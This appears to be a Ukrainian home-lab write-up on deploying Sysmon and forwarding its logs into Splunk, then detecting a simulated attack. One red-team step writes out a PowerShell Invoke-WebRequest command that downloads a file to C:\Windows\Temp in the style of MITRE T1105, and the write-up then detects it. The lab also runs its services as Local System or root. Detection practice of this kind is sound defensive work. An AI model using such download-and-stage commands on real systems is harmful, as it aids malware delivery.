\# 🔬 Модуль 3: Просунутий моніторинг за допомогою Sysmon



\## 📌 Огляд модуля

Штатних логів Windows (`Security.evtx`) часто недостатньо для глибокого форензик-аналізу та розслідування інцидентів, оскільки вони не фіксують деталі командного рядка або мережеву активність конкретних бінарних файлів. 



Для розширення можливостей видимості (Visibility) в інфраструктуру було впроваджено \*\*Microsoft Sysmon (System Monitor)\*\* із галузевим безпековим конфігом від \*\*SwiftOnSecurity\*\*. Логи було успішно інтегровано, типізовано та проаналізовано в SIEM Splunk.



\---



\## 🛠️ Етап 1: Встановлення Sysmon та налаштування Forwarder



1\. На цільовому Windows-ендпоінті було розгорнуто Sysmon за допомогою командного рядка:

```

powershell

&#x20;  .\\Sysmon64.exe -i sysmonconfig-export.xml -accepteula

```

Для забезпечення максимальної стабільності та уникнення конфліктів парсингу XML на стороні SIEM, конфігурацію Splunk Universal Forwarder (inputs.conf) було переведено в оптимізований текстовий режим (Plain Text):



```

\[WinEventLog://Microsoft-Windows-Sysmon/Operational]

disabled = 0

start\_from = oldest

current\_only = 0

checkpointInterval = 5

index = windows\_security

sourcetype = WinEventLog:Security

```



Кейс із практики: Розслідування та вирішення помилки доступу (errorCode=5)

Під час первинного налаштування збору логів Sysmon у внутрішніх журналах форвардера (splunkd.log) було виявлено критичну помилку:

Init failed, unable to subscribe to Windows Event Log channel 'Microsoft-Windows-Sysmon/Operational': errorCode=5



🕵️‍♂️ Аналіз інциденту (Root Cause Analysis):

У системі Windows errorCode=5 безальтернативно вказує на помилку Access Is Denied (Доступ заборонено). Оскільки служба SplunkForwarder працювала від імені обмеженого локального користувача, операційна система блокувала спроби зчитування високозахищеного журналу Sysmon.



🔧 Рішення:

через консоль керування службами (services.msc) обліковий запис для входу служби SplunkForwarder було примусово змінено з локального користувача на Local System account (Локальна система). Після повного перезапуску служби форвардер отримав необхідні привілеї, і збір логів стабілізувався.



🚀 Практичний кейс: Детекція дій зловмисника (Red vs Blue)

1\. Емуляція атаки (Red Team Phase)

Для перевірки видимості було симульовано класичну хакерську техніку обходу захисту та завантаження шкідливого ПЗ (Ingress Tool Transfer — MITRE ATT\&CK T1105). Через PowerShell від імені Адміністратора було запущено команду прихованого скачування файлу в обхід веброботи:



```

powershell -Command "Invoke-WebRequest -Uri \[https://httpbin.org/get](https://httpbin.org/get) -OutFile C:\\Windows\\Temp\\test.ps1"

```



2\. Виявлення в SIEM Splunk (Blue Team Phase)

Завдяки Sysmon, SIEM отримала повний контекст події. Для миттєвого виявлення таких аномалій було розроблено аналітичний SPL-запит, який фокусується на створенні процесів (EventCode=1)



!\[Логи сфабрикованого інциденту](../img/sysmon-catch.png)





📊 Результати аналізу артефактів:

EventCode=1 — Створення нового процесу (Process Creation).



User — Чітко вказує на обліковий запис, у сесії якого було виконано команду.



Image — Фіксує легітимний бінарник C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, який було використано як зброю (Living off the Land техніка).



CommandLine — Головна цінність Sysmon. Повністю розкриває наміри хакера, показуючи сирий текст утиліти Invoke-WebRequest, URL-адресу джерела атаки та точний шлях куди було збережено файл (C:\\Windows\\Temp\\test.ps1).





🤖 Автоматизація: Налаштування автозапуску SIEM на Linux

Для оптимізації роботи інфраструктури лабораторії було вирішено проблему ручного старту Splunk Enterprise після кожного рестарту Ubuntu Server. Керування процесом було повністю передано системному менеджеру systemd.



```

sudo /opt/splunk/bin/splunk enable boot-start -systemd-managed 1 -user root --run-as-root

```



Службу Splunkd.service було активовано та додано в автозавантаження ОС:



```

sudo systemctl daemon-reload

sudo systemctl enable Splunkd

sudo systemctl start Splunkd

```

Тепер SIEM-платформа автоматично піднімається у статус active (running) при кожному ввімкненні гіпервізора.

